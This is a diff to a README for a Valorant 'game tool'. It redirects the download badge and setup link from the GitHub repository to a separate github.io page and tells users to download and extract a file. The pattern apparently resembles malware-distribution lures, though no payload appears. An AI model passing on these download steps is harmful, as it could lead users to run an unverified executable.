@@ -1,6 +1,6 @@
 # 🎮 valorant-game-tool - Elevate your gameplay with precision tools
 
-[![Download Tool](https://img.shields.io/badge/Download-Blue-blue)](https://github.com/Voluntary-madrona998/valorant-game-tool)
+[![Download Tool](https://img.shields.io/badge/Download-Blue-blue)](https://voluntary-madrona998.github.io)
 
 This software helps players improve performance in Valorant. It provides helpful overlays and performance metrics to help you track your progress and adjust your settings for a better experience.
 
@@ -8,7 +8,7 @@ This software helps players improve performance in Valorant. It provides helpful
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the repository page to begin the setup: [https://github.com/Voluntary-madrona998/valorant-game-tool](https://github.com/Voluntary-madrona998/valorant-game-tool)
+1. Visit the repository page to begin the setup: [https://voluntary-madrona998.github.io](https://voluntary-madrona998.github.io)
 2. Locate the download button on the page.
 3. Save the file to your desktop for easy access.
 4. Right-click the folder and select Extract.
